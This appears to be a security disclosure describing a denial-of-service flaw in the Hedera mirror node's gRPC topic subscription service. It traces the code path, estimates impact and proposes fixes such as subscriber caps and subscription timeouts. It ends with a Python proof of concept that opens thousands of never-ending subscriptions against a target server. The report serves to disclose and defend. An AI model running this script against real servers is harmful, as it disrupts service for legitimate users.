### Title
Unbounded Indefinite Subscriptions via `limit=0` Enable Resource Exhaustion DoS

### Summary
An unprivileged external user can send a `ConsensusTopicQuery` with `limit=0` and no `endTime`, causing `TopicMessageServiceImpl` to create a reactive stream that never self-terminates on message count. Because there is no global subscriber cap enforced and `maxConcurrentCallsPerConnection` only limits per-connection concurrency, an attacker opening many connections can accumulate an unbounded number of indefinite subscriptions, exhausting thread pool, memory, and database connection resources on the gRPC server.

### Finding Description

**Code path:**

In `ConsensusController.toFilter()`, the raw protobuf `limit` field is passed directly to the filter builder: [1](#0-0) 

`TopicMessageFilter.hasLimit()` returns `true` only when `limit > 0`: [2](#0-1) 

In `TopicMessageServiceImpl.subscribeTopic()`, the `.take()` operator that bounds the stream by message count is only applied when `hasLimit()` is true: [3](#0-2) 

When `limit=0` and no `endTime` is set, `pastEndTime()` returns `Flux.never()`, so there is no time-based termination either: [4](#0-3) 

The only termination path is client-initiated cancellation via the cancel handler: [5](#0-4) 

**No global subscriber cap is enforced.** `subscriberCount` is only a Micrometer gauge metric — it is never checked against a maximum before accepting a new subscription: [6](#0-5) 

**Per-connection limit is insufficient.** `maxConcurrentCallsPerConnection=5` limits streams per TCP connection, but there is no limit on the number of connections an attacker can open: [7](#0-6) 

Each indefinite subscription holds: a `TopicContext` object, a per-subscriber backpressure buffer of up to 16,384 entries, a `boundedElastic` scheduler thread, and (for `POLL`/`SHARED_POLL` listener types) a polling loop against the database: [8](#0-7) [9](#0-8) 

### Impact Explanation

Each attacker-controlled connection can hold 5 concurrent indefinite streams. With N connections, the attacker accumulates 5N live reactive pipelines, each consuming heap memory (buffer), scheduler threads from `boundedElastic`, and (in polling mode) periodic database queries. At sufficient scale this exhausts the JVM heap, saturates the `boundedElastic` thread pool, and starves the database connection pool — causing the gRPC server to become unresponsive to all clients, including legitimate ones. This maps directly to the stated critical impact: network inability to confirm new transactions via the mirror node's HCS subscription service.

### Likelihood Explanation

No authentication or authorization is required to call `subscribeTopic`. The gRPC port is publicly exposed by design. The attack requires only a standard gRPC client library and the ability to open many TCP connections — trivially achievable from a single machine or a small botnet. The attack is repeatable and persistent as long as the attacker keeps connections open. The `limit=0` behavior is explicitly documented as valid in the protocol spec (`docs/design/hcs.md` line 65), so no special knowledge is needed. [10](#0-9) 

### Recommendation

1. **Enforce a global maximum subscriber count**: Check `subscriberCount` before accepting a new subscription in `TopicMessageServiceImpl.subscribeTopic()` and return a `RESOURCE_EXHAUSTED` gRPC status when the cap is exceeded.
2. **Enforce a per-IP connection limit** at the Netty/load-balancer layer to prevent a single source from opening unbounded connections.
3. **Enforce a server-side maximum subscription duration** (e.g., a configurable `maxSubscriptionDuration`) so that indefinite subscriptions are forcibly terminated after a timeout, requiring clients to re-subscribe.
4. **Optionally require authentication** (e.g., a signed HCS query) for indefinite (`limit=0`) subscriptions to raise the cost of abuse.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_NUM = 1  # any valid topic ID

def open_indefinite_subscription():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
        # limit omitted (defaults to 0) → hasLimit()=false
        # consensusEndTime omitted → no time-based termination
    )
    # Consume responses to keep stream alive; never cancel
    for _ in stub.subscribeTopic(query):
        pass

# Open many connections, each with up to 5 streams
threads = []
for _ in range(1000):  # 1000 connections × 5 streams = 5000 indefinite subscriptions
    for _ in range(5):
        t = threading.Thread(target=open_indefinite_subscription, daemon=True)
        t.start()
        threads.append(t)

for t in threads:
    t.join()
```

Each call holds a live reactive pipeline with a 16,384-entry buffer and a scheduler thread indefinitely. At 5,000 concurrent subscriptions the server's `boundedElastic` pool and heap are exhausted, causing all subsequent `subscribeTopic` calls (and other gRPC calls) to fail or time out.
